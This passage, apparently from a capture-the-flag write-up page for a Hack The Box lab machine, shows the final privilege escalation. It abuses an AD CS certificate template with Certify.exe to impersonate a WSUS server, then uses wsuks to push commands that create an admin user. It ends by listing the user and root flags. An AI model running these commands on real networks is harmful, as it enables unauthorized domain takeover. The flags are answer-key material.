+              &nbsp;&nbsp;&nbsp;&nbsp;Certificate Name Flag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : EnrolleeSuppliesSubject <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Extended Key Usage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Server Authentication <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Requires Manager Approval&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : False <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Requires Key Archival&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : False <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Authorized Signatures Required&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 0 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Schema Version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 2 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Validity Period&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 10 years <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Renewal Period&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 6 weeks <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Minimum RSA Key Length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 2048 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Template Created&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 2026-04-17T00:41:06+00:00 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Template Last Modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 2026-04-17T00:41:07+00:00 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Permissions <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enrollment Permissions <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enrollment Rights&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : LOGGING.HTB\IT <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Domain Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Enterprise Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object Control Permissions <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Owner&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : LOGGING.HTB\Administrator <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Full Control Principals&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : LOGGING.HTB\Domain Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Enterprise Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write Owner Principals&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: LOGGING.HTB\Domain Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Enterprise Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write Dacl Principals&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : LOGGING.HTB\Domain Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Enterprise Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write Property Enroll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : LOGGING.HTB\Domain Admins <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGGING.HTB\Enterprise Admins <br>
+              [...]
+          </div>
+
+          <p>
+            We can use the <span class="highlight">UpdateSrv</span> template with the <span class="highlight">LOGGING.HTB\IT</span> 
+            role, which jaylee happens to hold.
+          </p>
+
+          <p>
+            I therefore use <span class="highlight">Certify.exe</span> on the target machine to generate a certificate with this template 
+            after retrieving the CA name:
+          </p>
+          
+          <div class="code">
+            PS C:\Users\jaylee.clifton\Desktop> .\Certify.exe cas&nbsp;&nbsp;<br>
+            [...] <br>
+            [*] Enterprise/Enrollment CAs: <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Enterprise CA Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: logging-DC01-CA <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;DNS Hostname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: DC01.logging.htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;FullName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: DC01.logging.htb\logging-DC01-CA <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Flags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert SubjectName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: CN=logging-DC01-CA, DC=logging, DC=htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert Thumbprint&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 2DF3A80A22B1C559D4CD9A7815766707756E44FD <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert Serial&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 196621CCC95B9C904E63B58E449ABC04 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert Start Date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 4/16/2026 8:20:00 PM <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert End Date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 4/16/2126 8:30:00 PM <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Cert Chain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: CN=logging-DC01-CA,DC=logging,DC=htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;UserSpecifiedSAN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Disabled <br>
+            [...] <br>
+            <br>
+            PS C:\Users\jaylee.clifton\Desktop> .\Certify.exe request /ca:DC01.logging.htb\logging-DC01-CA /template:UpdateSrv /subject:"CN=WSUS.logging.htb" <br>
+            .\Certify.exe request /ca:DC01.logging.htb\logging-DC01-CA /template:UpdateSrv /subject:"CN=WSUS.logging.htb" <br>
+            <br>
+            &nbsp;&nbsp; _____&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp; _&nbsp;&nbsp;__&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            &nbsp;&nbsp;/ ____|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| | (_)/ _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+            | |&nbsp;&nbsp;&nbsp;&nbsp; ___ _ __| |_ _| |_ _&nbsp;&nbsp; _&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            | |&nbsp;&nbsp;&nbsp;&nbsp;/ _ \ '__| __| |&nbsp;&nbsp;_| | | |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            | |___|&nbsp;&nbsp;__/ |&nbsp;&nbsp;| |_| | | | |_| |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+            &nbsp;&nbsp;\_____\___|_|&nbsp;&nbsp; \__|_|_|&nbsp;&nbsp;\__, |&nbsp;&nbsp;&nbsp;&nbsp;<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __/ |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|___./&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            &nbsp;&nbsp;v1.0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+            <br>
+            [*] Action: Request a Certificates <br>
+            <br>
+            [*] Current user context&nbsp;&nbsp;&nbsp;&nbsp;: logging\jaylee.clifton <br>
+            <br>
+            [*] Template&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: UpdateSrv <br>
+            [*] Subject&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : CN=WSUS.logging.htb <br>
+            <br>
+            [*] Certificate Authority&nbsp;&nbsp; : DC01.logging.htb\logging-DC01-CA <br>
+            <br>
+            [*] CA Response&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : The certificate had been issued. <br>
+            [*] Request ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 8 <br>
+            <br>
+            [*] cert.pem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : <br>
+            <br>
+            -----BEGIN RSA PRIVATE KEY----- <br>
+            [...]
+          </div>
+
+          <p>
+            I then copied the certificate into the <span class="highlight">cert.pem</span> file and restarted <span class="highlight">wsuks</span>. 
+            In this case the exploit did not work correctly out of the box. The default wsuks payload correctly created the user but did not add it 
+            to the local Admins group. I modify the payload as follows (running two iterations):
+          </p>
+          
+          <div class="code">
+            sudo wsuks -I tun0 --serve-only --WSUS-Port 8531 --tls-cert cert.pem --command "/accepteula /s cmd.exe /c net user k0d14k Password123! /add"
+          </div>
+
+          <div class="code">
+            sudo wsuks -I tun0 --serve-only --WSUS-Port 8531 --tls-cert cert.pem --command "/accepteula /s cmd.exe /c net localgroup administrators logging.htb\k0d14k /add"
+          </div>
+
+          <p>This way we added a new user and added it to the local administrators group, effectively becoming Domain Administrators.</p>
+
+          <p>The root flag is located on <span class="highlight">toby.brynleigh</span>'s Desktop.</p>
+
+          <img src="images/Pasted image 20260422234616.png" width="1000rem">
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> 40235f9d10c1786bcf2d9dc4282d5b50</h3>
+            <h3><b>Root Flag:</b> f762fcfb5f6835c652051be8a8d92052</h3>
+        </section>
+
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
